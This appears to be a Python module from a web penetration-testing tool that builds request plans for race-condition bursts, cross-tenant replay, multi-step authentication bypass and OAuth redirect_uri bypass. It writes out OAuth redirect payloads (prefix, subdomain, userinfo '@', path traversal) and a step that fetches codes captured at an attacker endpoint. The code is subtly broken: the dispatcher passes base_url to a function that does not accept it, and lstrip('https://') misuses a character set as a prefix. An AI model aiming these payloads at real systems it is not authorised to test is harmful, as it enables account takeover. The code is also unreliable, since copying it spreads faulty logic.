"""Family execution plan builder — the active-execution bridge.

Converts a :class:`FamilyCandidate` into a concrete, bounded request plan
that the project's SSRF-pinned HTTP client can execute. No I/O here — this
module only produces the plan (method/url/headers/body/count/negative-control
shape). Scope and ActionAuthority enforcement happens at the execution layer.

Each plan carries an explicit negative control so the validator downstream
can confirm causally (CQA-style).
"""
from __future__ import annotations

import hashlib
from dataclasses import dataclass, field
from typing import Any

from webpent.families.base import FamilyCandidate


@dataclass(frozen=True)
class RequestPlan:
    method: str
    url: str
    headers: dict[str, str] = field(default_factory=dict)
    body: str | None = None
    label: str = ""


@dataclass(frozen=True)
class ExecutionPlan:
    family: str
    scenario_id: str
    discriminator: list[RequestPlan]
    negative_control: list[RequestPlan]
    post_state_check: RequestPlan | None
    max_concurrency: int = 1
    safe_in_production: bool = False


def _digest(value: str) -> str:
    return hashlib.sha256(value.encode("utf-8", "replace")).hexdigest()[:12]


def _abs(base_url: str, path: str) -> str:
    """Ensure absolute http(s) URL. Prefix relative paths with base_url."""
    if path.startswith("http://") or path.startswith("https://"):
        return path
    base = base_url.rstrip("/") if base_url else "https://unresolved-target.local"
    return f"{base}/{path.lstrip('/')}"


def _endpoint_parts(candidate: FamilyCandidate) -> tuple[str, str]:
    ae = candidate.affected_endpoint or ""
    if " " in ae:
        method, path = ae.split(" ", 1)
        return method.upper(), path
    return "POST", ae


def build_race_plan(candidate: FamilyCandidate, *, burst_size: int = 10, base_url: str = "") -> ExecutionPlan:
    """Synchronized burst + sequential negative control + post-state read."""
    method, path = _endpoint_parts(candidate)
    url = _abs(base_url, path)
    burst = [RequestPlan(method=method, url=url, label=f"burst-{i}") for i in range(burst_size)]
    sequential = [RequestPlan(method=method, url=url, label=f"seq-{i}") for i in range(burst_size)]
    return ExecutionPlan(
        family="race_condition", scenario_id=candidate.scenario_id,
        discriminator=burst, negative_control=sequential,
        post_state_check=RequestPlan(method="GET", url=url, label="post-state-read"),
        max_concurrency=burst_size, safe_in_production=False,
    )


def build_tenant_plan(
    candidate: FamilyCandidate,
    *,
    actor_a_session: str = "",
    foreign_resource_ref: str = "",
    foreign_tenant_id: str = "",
    base_url: str = "",
) -> ExecutionPlan:
    """Cross-tenant replay + same-tenant negative control."""
    _, path = _endpoint_parts(candidate)
    url = _abs(base_url, path)
    actor_a = RequestPlan(method="GET", url=f"{url}/{foreign_resource_ref}".rstrip("/"),
                          headers={"Authorization": actor_a_session} if actor_a_session else {},
                          label="actor-a-foreign-tenant")
    same_tenant_neg = RequestPlan(method="GET", url=url, label="same-tenant-different-user-negative")
    baseline = RequestPlan(method="GET", url=f"{url}/{foreign_resource_ref}".rstrip("/"), label="actor-b-baseline")
    return ExecutionPlan(
        family="tenant_isolation", scenario_id=candidate.scenario_id,
        discriminator=[actor_a], negative_control=[same_tenant_neg, baseline],
        post_state_check=None, max_concurrency=1, safe_in_production=False,
    )


def build_multi_step_auth_plan(
    candidate: FamilyCandidate,
    *,
    final_step_url: str = "",
    step_count: int = 2,
) -> ExecutionPlan:
    """Direct final-step replay + full-sequence negative control + session check."""
    direct = RequestPlan(method="POST", url=final_step_url or candidate.affected_endpoint, label="direct-final-step")
    seq = [RequestPlan(method="POST", url=final_step_url, label=f"seq-step-{i}") for i in range(step_count)]
    session_check = RequestPlan(method="GET", url="/api/me", label="post-bypass-session-check")
    return ExecutionPlan(
        family="multi_step_auth_bypass", scenario_id=candidate.scenario_id,
        discriminator=[direct], negative_control=seq,
        post_state_check=session_check, max_concurrency=1, safe_in_production=False,
    )


def build_oauth_plan(
    candidate: FamilyCandidate,
    *,
    authorize_url: str = "",
    client_id: str = "",
    attacker_redirect_uri: str = "",
    bypass_variant: str = "prefix",
) -> ExecutionPlan:
    """OAuth authorize request with redirect_uri bypass + negative control.

    Variants: prefix, suffix, subdomain, userinfo(@), path-traversal,
    exact-match-negative. The attacker endpoint captures the code.
    """
    variants = {
        "prefix": f"{attacker_redirect_uri}.legit.com",
        "suffix": f"https://legit.com.{attacker_redirect_uri.lstrip('https://')}",
        "subdomain": f"https://{attacker_redirect_uri}.legit.com",
        "userinfo": f"https://legit.com@{attacker_redirect_uri.lstrip('https://')}",
        "path_traversal": f"https://legit.com/../{attacker_redirect_uri.lstrip('https://')}",
    }
    redirect_uri = variants.get(bypass_variant, attacker_redirect_uri)
    state = _digest(f"oauth-state-{candidate.candidate_id}")
    authorize = RequestPlan(
        method="GET",
        url=(f"{authorize_url}?response_type=code&client_id={client_id}"
             f"&redirect_uri={redirect_uri}&state={state}&scope=openid"),
        label=f"oauth-authorize-{bypass_variant}",
    )
    negative = RequestPlan(
        method="GET",
        url=(f"{authorize_url}?response_type=code&client_id={client_id}"
             f"&redirect_uri=https://registered-callback.legit.com/callback&state={state}"),
        label="oauth-exact-redirect-negative",
    )
    attacker_capture = RequestPlan(method="GET", url=attacker_redirect_uri, label="attacker-code-capture")
    return ExecutionPlan(
        family="oauth", scenario_id=candidate.scenario_id,
        discriminator=[authorize], negative_control=[negative],
        post_state_check=attacker_capture, max_concurrency=1, safe_in_production=True,
    )


def build_plan_for(candidate: FamilyCandidate, **kwargs: Any) -> ExecutionPlan | None:
    """Dispatch to the right plan builder by family. base_url is forwarded."""
    family = str(candidate.family.value if hasattr(candidate.family, "value") else candidate.family)
    base_url = kwargs.get("base_url", "")
    if family == "race_condition":
        return build_race_plan(candidate, burst_size=kwargs.get("burst_size", 10), base_url=base_url)
    if family == "tenant_isolation":
        return build_tenant_plan(candidate, base_url=base_url,
                                 actor_a_session=kwargs.get("actor_a_session", ""),
                                 foreign_resource_ref=kwargs.get("foreign_resource_ref", ""),
                                 foreign_tenant_id=kwargs.get("foreign_tenant_id", ""))
    if family == "multi_step_auth_bypass":
        return build_multi_step_auth_plan(candidate, base_url=base_url,
                                          final_step_url=kwargs.get("final_step_url", ""),
                                          step_count=kwargs.get("step_count", 2))
    if family == "oauth":
        return build_oauth_plan(candidate, authorize_url=kwargs.get("authorize_url", ""),
                                client_id=kwargs.get("client_id", ""),
                                attacker_redirect_uri=kwargs.get("attacker_redirect_uri", ""),
                                bypass_variant=kwargs.get("bypass_variant", "prefix"))
    return None  # business_logic / exploit_chain plans are composed from feeders at runtime


__all__ = ["ExecutionPlan", "RequestPlan", "build_oauth_plan", "build_multi_step_auth_plan", "build_plan_for", "build_race_plan", "build_tenant_plan"]
